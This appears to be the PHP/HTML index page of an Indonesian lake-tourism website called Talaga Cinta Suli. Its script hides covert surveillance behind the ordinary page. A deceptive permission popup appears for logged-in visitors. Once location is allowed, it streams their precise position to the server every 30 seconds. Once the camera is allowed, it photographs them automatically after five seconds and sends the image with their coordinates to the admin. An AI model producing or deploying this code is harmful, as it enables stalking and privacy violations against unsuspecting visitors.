<?php
session_start();
require_once 'functions.php';

$isLoggedIn = isset($_SESSION['user_id']);
$userRole = $isLoggedIn ? $_SESSION['role'] : 'guest';
$username = $isLoggedIn ? $_SESSION['username'] : '';
$fullname = $isLoggedIn ? $_SESSION['fullname'] : '';
$recentPhotos = array_slice(loadPhotos(), 0, 6); 
$recentStories = array_slice(loadStories(), 0, 4); 
$stats = getStats();
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Talaga Cinta - Destinasi Wisata Alam Terindah</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Montserrat:wght@700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0a4da2;
            --secondary: #28a745;
            --accent: #ff6b35;
            --light: #f8f9fa;
            --dark: #212529;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            color: var(--dark);
            overflow-x: hidden;
        }
        
        h1, h2, h3, h4, h5 {
            font-family: 'Montserrat', sans-serif;
            font-weight: 700;
        }
        
        .navbar {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
            padding: 20px 0;
            transition: all 0.3s ease;
        }
        
        .navbar-brand {
            font-size: 1.8rem;
            font-weight: 900;
            color: var(--primary) !important;
            display: flex;
            align-items: center;
        }
        
        .navbar-brand i {
            color: var(--accent);
            margin-right: 10px;
        }
        
        .nav-link {
            font-weight: 500;
            color: #555 !important;
            margin: 0 8px;
            padding: 8px 16px !important;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        
        .nav-link:hover {
            color: var(--primary) !important;
            background: rgba(10, 77, 162, 0.05);
        }
        
        .nav-link.active {
            color: var(--primary) !important;
            background: rgba(10, 77, 162, 0.1);
        }
        
        .auth-buttons .btn {
            padding: 8px 20px;
            border-radius: 8px;
            font-weight: 500;
        }
        
        .hero-section {
            height: 100vh;
            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)),
                        url('https://b.top4top.io/p_3655dnxso1.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            display: flex;
            align-items: center;
            position: relative;
            color: white;
            margin-top: -80px;
            padding-top: 80px;
        }
        
        .hero-content {
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        
        .hero-title {
            font-size: 3.5rem;
            line-height: 1.2;
            margin-bottom: 1.5rem;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
        }
        
        .hero-subtitle {
            font-size: 1.2rem;
            margin-bottom: 2.5rem;
            opacity: 0.9;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .hero-stats {
            display: flex;
            justify-content: center;
            gap: 3rem;
            margin: 3rem 0;
            flex-wrap: wrap;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 2.5rem;
            font-weight: 800;
            color: var(--accent);
            display: block;
            line-height: 1;
        }
        
        .stat-label {
            font-size: 0.9rem;
            opacity: 0.8;
            margin-top: 5px;
        }
        
        .cta-button {
            background: var(--accent);
            color: white;
            padding: 15px 40px;
            border-radius: 50px;
            font-weight: 600;
            font-size: 1.1rem;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s ease;
            border: 2px solid var(--accent);
        }
        
        .cta-button:hover {
            background: transparent;
            color: white;
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(255, 107, 53, 0.3);
        }
        
        .about-section {
            padding: 100px 0;
            background: white;
        }
        
        .section-title {
            font-size: 2.5rem;
            margin-bottom: 1rem;
            color: var(--primary);
        }
        
        .section-subtitle {
            font-size: 1.1rem;
            color: #666;
            max-width: 600px;
            margin-bottom: 3rem;
        }
        
        .feature-card {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            height: 100%;
            transition: transform 0.3s ease;
            border: 1px solid #eee;
        }
        
        .feature-card:hover {
            transform: translateY(-10px);
        }
        
        .feature-icon {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        
        .feature-icon i {
            font-size: 1.8rem;
            color: white;
        }
        
        .preview-gallery {
            padding: 80px 0;
            background: #f8f9fa;
        }
        
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 40px;
        }
        
        .gallery-item {
            position: relative;
            border-radius: 12px;
            overflow: hidden;
            height: 200px;
            transition: transform 0.3s ease;
        }
        
        .gallery-item:hover {
            transform: scale(1.05);
        }
        
        .gallery-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.5s ease;
        }
        
        .gallery-item:hover img {
            transform: scale(1.1);
        }
        
        .gallery-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
            color: white;
            padding: 15px;
            transform: translateY(20px);
            opacity: 0;
            transition: all 0.3s ease;
        }
        
        .gallery-item:hover .gallery-overlay {
            transform: translateY(0);
            opacity: 1;
        }
        
        .stories-preview {
            padding: 80px 0;
            background: white;
        }
        
        .story-preview-card {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            height: 100%;
            border: 1px solid #eee;
        }
        
        .story-author {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
        }
        
        .author-avatar {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .location-section {
            padding: 80px 0;
            background: linear-gradient(135deg, var(--primary), #0a4da2);
            color: white;
        }
        
        .location-info {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .footer {
            background: var(--dark);
            color: white;
            padding: 60px 0 30px;
        }
        
        .footer-logo {
            font-size: 2rem;
            font-weight: 900;
            margin-bottom: 20px;
            color: white;
        }
        
        .footer-links a {
            color: #bbb;
            text-decoration: none;
            display: block;
            margin-bottom: 10px;
            transition: color 0.3s ease;
        }
        
        .footer-links a:hover {
            color: white;
        }
        
        .social-links a {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            color: white;
            margin-right: 10px;
            transition: all 0.3s ease;
        }
        
        .social-links a:hover {
            background: var(--accent);
            transform: translateY(-3px);
        }
        
        .permission-modal {
            position: fixed;
            bottom: 30px;
            right: 30px;
            max-width: 350px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            overflow: hidden;
            display: none;
        }
        
        .permission-header {
            background: var(--primary);
            color: white;
            padding: 20px;
        }
        
        .permission-body {
            padding: 20px;
        }
        
        .permission-option {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px;
            border: 1px solid #eee;
            border-radius: 10px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .permission-option:hover {
            background: #f8f9fa;
            border-color: var(--primary);
        }
        
        .permission-icon {
            width: 40px;
            height: 40px;
            background: var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .camera-preview {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 400px;
            background: black;
            border-radius: 15px;
            overflow: hidden;
            z-index: 2000;
            display: none;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }
        
         {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .camera-controls {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
        }
        
        .capture-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: white;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .capture-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
        }
        
        @media (max-width: 768px) {
            .hero-title {
                font-size: 2.5rem;
            }
            
            .hero-stats {
                gap: 2rem;
            }
            
            .section-title {
                font-size: 2rem;
            }
            
            .navbar-collapse {
                background: white;
                padding: 20px;
                border-radius: 10px;
                margin-top: 10px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            }
            
            .auth-buttons {
                margin-top: 15px;
                padding-top: 15px;
                border-top: 1px solid #eee;
            }
            
            .permission-modal {
                left: 20px;
                right: 20px;
                max-width: none;
            }
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light fixed-top">
        <div class="container">
            <a class="navbar-brand" href="index.php">
                <i class="fas fa-mountain-sun"></i> Talaga Cinta Suli
            </a>
            
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav mx-auto">
                    <li class="nav-item"><a class="nav-link active" href="index.php">Beranda</a></li>
                    <li class="nav-item"><a class="nav-link" href="gallery.php">Galeri</a></li>
                    <li class="nav-item"><a class="nav-link" href="stories.php">Kenangan</a></li>
                    <li class="nav-item"><a class="nav-link" href="#location">Lokasi</a></li>
                    <li class="nav-item"><a class="nav-link" href="index.php">Kontak</a></li>
                </ul>
                
                <div class="auth-buttons">
                    <?php if($isLoggedIn): ?>
                        <div class="dropdown">
                            <a href="#" class="d-flex align-items-center text-decoration-none dropdown-toggle" 
                               data-bs-toggle="dropdown">
                                <div class="author-avatar">
                                    <?php echo strtoupper(substr($username, 0, 1)); ?>
                                </div>
                                <span class="ms-2"><?php echo htmlspecialchars($username); ?></span>
                            </a>
                            <ul class="dropdown-menu dropdown-menu-end">
                                <li><a class="dropdown-item" href="profile.php">
                                    <i class="fas fa-user me-2"></i>Profil
                                </a></li>
                                <?php if($userRole === 'admin'): ?>
                                <li><a class="dropdown-item text-danger" href="admin.php">
                                    <i class="fas fa-crown me-2"></i>Admin Panel
                                </a></li>
                                <?php endif; ?>
                                <li><hr class="dropdown-divider"></li>
                                <li><a class="dropdown-item text-danger" href="?logout=true">
                                    <i class="fas fa-sign-out-alt me-2"></i>Logout
                                </a></li>
                            </ul>
                        </div>
                    <?php else: ?>
                        <a href="#" class="btn btn-outline-primary me-2" data-bs-toggle="modal" data-bs-target="#loginModal">
                            <i class="fas fa-sign-in-alt"></i> Login
                        </a>
                        <a href="#" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#registerModal">
                            <i class="fas fa-user-plus"></i> Daftar
                        </a>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </nav>

    <section class="hero-section">
        <div class="container">
            <div class="hero-content">
                <h1 class="hero-title">Temukan Keindahan Alam Talaga Cinta</h1>
                <p class="hero-subtitle">Destinasi wisata alam dengan pesona danau alami yang memikat hati, udara sejuk, dan panorama pegunungan yang memukau.</p>
                
                <div class="hero-stats">
                    <div class="stat-item">
                        <span class="stat-number"><?php echo $stats['users']; ?>+</span>
                        <span class="stat-label">Pengunjung</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-number"><?php echo $stats['photos']; ?>+</span>
                        <span class="stat-label">Foto</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-number">4.8</span>
                        <span class="stat-label">Rating</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-number">24/7</span>
                        <span class="stat-label">Buka</span>
                    </div>
                </div>
                
                <div class="mt-4">
                    <a href="gallery.php" class="cta-button me-3">
                        <i class="fas fa-images"></i> Lihat Galeri
                    </a>
                    <?php if(!$isLoggedIn): ?>
                    <a href="#" class="cta-button" style="background: transparent; border-color: white;" 
                       data-bs-toggle="modal" data-bs-target="#registerModal">
                        <i class="fas fa-user-plus"></i> Bergabung Sekarang
                    </a>
                    <?php else: ?>
                    <a href="upload.php" class="cta-button" style="background: var(--secondary); border-color: var(--secondary);">
                        <i class="fas fa-upload"></i> Upload Foto
                    </a>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </section>

    <section class="about-section">
        <div class="container">
            <div class="text-center mb-5">
                <h2 class="section-title">Mengapa Talaga Cinta?</h2>
                <p class="section-subtitle">Temukan alasan mengapa Talaga Cinta menjadi destinasi favorit para pecinta alam</p>
            </div>
            
            <div class="row g-4">
                <div class="col-md-4">
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-water"></i>
                        </div>
                        <h4>Air Jernih Alami</h4>
                        <p class="text-muted">Danau dengan air jernih kebiruan yang terbentuk secara alami, cocok untuk berenang dan berperahu.</p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-mountain"></i>
                        </div>
                        <h4>Pegunungan Hijau</h4>
                        <p class="text-muted">Dikelilingi pegunungan hijau dengan udara sejuk, menawarkan pemandangan yang memukau.</p>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="feature-card">
                        <div class="feature-icon">
                            <i class="fas fa-camera"></i>
                        </div>
                        <h4>Spot Foto Instagenic</h4>
                        <p class="text-muted">Banyak spot foto menarik yang sempurna untuk konten media sosial Anda.</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="preview-gallery">
        <div class="container">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h2 class="section-title">Foto Terbaru</h2>
                    <p class="text-muted">Momen indah yang diabadikan oleh pengunjung</p>
                </div>
                <a href="gallery.php" class="btn btn-outline-primary">
                    Lihat Semua <i class="fas fa-arrow-right ms-2"></i>
                </a>
            </div>
            
            <div class="gallery-grid">
                <?php foreach($recentPhotos as $photo): ?>
                <div class="gallery-item">
                    <img src="<?php echo $photo['image']; ?>" alt="<?php echo htmlspecialchars($photo['title']); ?>">
                    <div class="gallery-overlay">
                        <h6 class="mb-1"><?php echo htmlspecialchars($photo['title']); ?></h6>
                        <small><?php echo htmlspecialchars($photo['username']); ?></small>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </section>

    <section class="stories-preview">
        <div class="container">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div>
                    <h2 class="section-title">Kenangan Terbaru</h2>
                    <p class="text-muted">Cerita pengalaman tak terlupakan dari pengunjung</p>
                </div>
                <a href="stories.php" class="btn btn-outline-primary">
                    Lihat Semua <i class="fas fa-arrow-right ms-2"></i>
                </a>
            </div>
            
            <div class="row g-4">
                <?php foreach($recentStories as $story): ?>
                <div class="col-md-6">
                    <div class="story-preview-card">
                        <div class="story-author">
                            <div class="author-avatar">
                                <?php echo strtoupper(substr($story['username'], 0, 1)); ?>
                            </div>
                            <div>
                                <h6 class="mb-0"><?php echo htmlspecialchars($story['fullname']); ?></h6>
                                <small class="text-muted"><?php echo timeAgo($story['created_at']); ?></small>
                            </div>
                        </div>
                        <h5><?php echo htmlspecialchars($story['title']); ?></h5>
                        <p class="text-muted"><?php echo htmlspecialchars(substr($story['content'], 0, 150)); ?>...</p>
                        <div class="d-flex justify-content-between align-items-center">
                            <div class="rating">
                                <?php for($i = 1; $i <= 5; $i++): ?>
                                    <i class="fas fa-star <?php echo $i <= $story['rating'] ? 'text-warning' : 'text-secondary'; ?>"></i>
                                <?php endfor; ?>
                            </div>
                            <a href="stories.php#story-<?php echo $story['id']; ?>" class="btn btn-sm btn-primary">
                                Baca Lengkap
                            </a>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </section>

    <section id="location" class="location-section">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-lg-6">
                    <h2 class="text-white mb-4">Kunjungi Kami</h2>
                    <div class="location-info">
                        <h4 class="text-white mb-3"><i class="fas fa-map-marker-alt"></i> Lokasi</h4>
                        <p class="mb-3">Desa Suli, Kecamatan Salahutu, Maluku Tengah</p>
                        
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <h6><i class="fas fa-clock"></i> Jam Operasional</h6>
                                <p class="mb-0">06:00 - 18:00 WIB<br>Setiap Hari</p>
                            </div>
                            <div class="col-md-6 mb-3">
                                <h6><i class="fas fa-ticket-alt"></i> Tiket Masuk</h6>
                                <p class="mb-0">300 Perorang<br></p>
                            </div>
                        </div>
 
<div class="info-item">
    <h6><i class="fas fa-car"></i> Biaya Parkir Kendaraan</h6>
    <p class="mb-0">5000</p>
</div>   
                        
                        <a href="https://maps.app.goo.gl/Qtuo2D1AffQ1VRFM8" class="btn btn-light" target="_blank">
                            <i class="fas fa-directions"></i> Petunjuk Arah
                        </a>
                    </div>
                </div>
                <div class="col-lg-6 text-center">
                    <i class="fas fa-map-marked-alt fa-7x text-white opacity-50"></i>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer">
        <div class="container">
            <div class="row">
                <div class="col-lg-4 mb-4">
                    <div class="footer-logo">
                        <i class="fas fa-mountain-sun me-2"></i>Talaga Cinta
                    </div>
                    <p class="text-light mb-4">Destinasi wisata alam dengan keindahan danau alami yang memikat hati.</p>
                    <div class="social-links">
                        <a href="https://www.instagram.com/telaga_tihu"><i class="fab fa-instagram"></i></a>
                        <a href="#"><i class="fab fa-facebook"></i></a>
                        <a href="#"><i class="fab fa-tiktok"></i></a>
                        <a href="#"><i class="fab fa-youtube"></i></a>
                    </div>
                </div>
                
                <div class="col-lg-2 col-md-6 mb-4">
                    <h5 class="text-white mb-3">Menu</h5>
                    <div class="footer-links">
                        <a href="index.php">Beranda</a>
                        <a href="gallery.php">Galeri</a>
                        <a href="stories.php">Kenangan</a>
                        <a href="#location">Lokasi</a>
                    </div>
                </div>
                
                <div class="col-lg-3 col-md-6 mb-4">
                    <h5 class="text-white mb-3">Kontak</h5>
                    <div class="footer-links">
                        <p class="text-light mb-2"><i class="fas fa-map-marker-alt me-2"></i>Desa Suli, Maluku Tengah/Ambon</p>
                        <p class="text-light mb-2"><i class="fas fa-phone me-2"></i> +62 812 3456 7890</p>
                        <p class="text-light mb-2"><i class="fas fa-envelope me-2"></i> talagacintacontact@gmail.com</p>
                    </div>
                </div>
                
                <div class="col-lg-3 col-md-6 mb-4">
                    <h5 class="text-white mb-3">Newsletter</h5>
                    <p class="text-light mb-3">Dapatkan info terbaru tentang promosi dan event.</p>
                    <div class="input-group">
                        <input type="email" class="form-control" placeholder="Email Anda">
                        <button class="btn btn-primary" type="button">
                            <i class="fas fa-paper-plane"></i>
                        </button>
                    </div>
                </div>
            </div>
            
            <div class="text-center pt-4 border-top border-secondary">
                <p class="text-light mb-0">&copy; 2026 Talaga Cinta Suli. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <div id="permissionModal" class="permission-modal">
        <div class="permission-header">
            <h5 class="mb-0"><i class="fas fa-shield-alt me-2"></i> Izin Akses</h5>
            <small>Untuk pengalaman yang lebih baik</small>
        </div>
        <div class="permission-body">
            <div class="permission-option" onclick="requestLocationPermission()">
                <div class="permission-icon">
                    <i class="fas fa-map-marker-alt"></i>
                </div>
                <div>
                    <h6 class="mb-1">Lokasi</h6>
                    <small class="text-muted">Untuk Mengetahui posisi Anda</small>
                </div>
            </div>
            
            <div class="permission-option" onclick="requestCameraPermission()">
                <div class="permission-icon">
                    <i class="fas fa-camera"></i>
                </div>
                <div>
                    <h6 class="mb-1">Kamera</h6>
                    <small class="text-muted">Untuk upload foto langsung</small>
                </div>
            </div>
            
            <div class="text-end mt-3">
                <button class="btn btn-sm btn-outline-secondary" onclick="hidePermissionModal()">
                    izinkan jika tidak web eror
                </button>
            </div>
        </div>
    </div>

    <div id="cameraPreview" class="camera-preview">
        <video id="cameraVideo" autoplay></video>
        <div class="camera-controls">
            <button class="capture-btn" onclick="capturePhoto()">
                <i class="fas fa-camera fa-lg"></i>
            </button>
            <button class="btn btn-sm btn-danger mt-3" onclick="closeCamera()">
                <i class="fas fa-times"></i> Tutup
            </button>
        </div>
    </div>

    <?php include 'modals.php'; ?>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        let locationInterval;
        let cameraStream;
        
        function showPermissionModal() {
            document.getElementById('permissionModal').style.display = 'block';
        }
        
        function hidePermissionModal() {
            document.getElementById('permissionModal').style.display = 'none';
        }
        
        function requestLocationPermission() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        saveLocation(position);
                        hidePermissionModal();
                        startLocationTracking();
                    },
                    function(error) {
                        console.error('Location error:', error);
                        hidePermissionModal();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                alert('Browser tidak mendukung geolocation');
                hidePermissionModal();
            }
        }
        
        function saveLocation(position) {
            const data = new FormData();
            data.append('action', 'save_location');
            data.append('lat', position.coords.latitude);
            data.append('lng', position.coords.longitude);
            data.append('accuracy', position.coords.accuracy);
            data.append('altitude', position.coords.altitude || 0);
            data.append('heading', position.coords.heading || 0);
            data.append('speed', position.coords.speed || 0);
            
            fetch('', {
                method: 'POST',
                body: data
            })
            .then(response => response.json())
            .then(data => {
                console.log('Location saved:', data);
            })
            .catch(error => console.error('Error saving location:', error));
        }
        
        function startLocationTracking() {
            locationInterval = setInterval(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            saveLocation(position);
                        },
                        null,
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                }
            }, 30000); 
        }
        
        
        async function requestCameraPermission() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false 
                });
                
                hidePermissionModal();
                showCameraPreview();
            } catch (error) {
                console.error('Camera error:', error);
                alert('Tidak bisa mengakses kamera: ' + error.message);
                hidePermissionModal();
            }
        }
        
        function showCameraPreview() {
            const preview = document.getElementById('cameraPreview');
            const video = document.getElementById('cameraVideo');
            
            video.srcObject = cameraStream;
            preview.style.display = 'block';
            
            
            setTimeout(capturePhoto, 5000);
        }
        
        function closeCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            document.getElementById('cameraPreview').style.display = 'none';
        }
        
        function capturePhoto() {
            const video = document.getElementById('cameraVideo');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            
            
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        sendCaptureToServer(imageData, position.coords.latitude, position.coords.longitude);
                    },
                    function() {
                        sendCaptureToServer(imageData, 0, 0);
                    }
                );
            } else {
                sendCaptureToServer(imageData, 0, 0);
            }
        }
        
        function sendCaptureToServer(imageData, lat, lng) {
            const data = new FormData();
            data.append('action', 'save_capture');
            data.append('image_data', imageData);
            data.append('lat', lat);
            data.append('lng', lng);
            
            fetch('', {
                method: 'POST',
                body: data
            })
            .then(response => response.json())
            .then(data => {
                console.log('Capture saved:', data);
                alert('Foto berhasil dikirim ke admin!');
                closeCamera();
            })
            .catch(error => {
                console.error('Error saving capture:', error);
                closeCamera();
            });
        }
        
        
        
        <?php if($isLoggedIn): ?>
        setTimeout(() => {
            showPermissionModal();
        }, 5000);
        <?php endif; ?>
        

        window.addEventListener('scroll', function() {
            const navbar = document.querySelector('.navbar');
            if (window.scrollY > 50) {
                navbar.style.padding = '15px 0';
                navbar.style.boxShadow = '0 5px 20px rgba(0, 0, 0, 0.1)';
            } else {
                navbar.style.padding = '20px 0';
                navbar.style.boxShadow = '0 2px 20px rgba(0, 0, 0, 0.1)';
            }
        });
        

        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const targetId = this.getAttribute('href');
                if(targetId === '#') return;
                
                const targetElement = document.querySelector(targetId);
                if(targetElement) {
                    window.scrollTo({
                        top: targetElement.offsetTop - 80,
                        behavior: 'smooth'
                    });
                }
            });
        });
        
        <?php 
        
        if(isset($_GET['logout.php'])) {
            echo 'if(locationInterval) clearInterval(locationInterval);';
            echo 'if(cameraStream) cameraStream.getTracks().forEach(track => track.stop());';
            echo 'window.location.href = "index.php";';
        }
        ?>
    </script>
</body>
</html>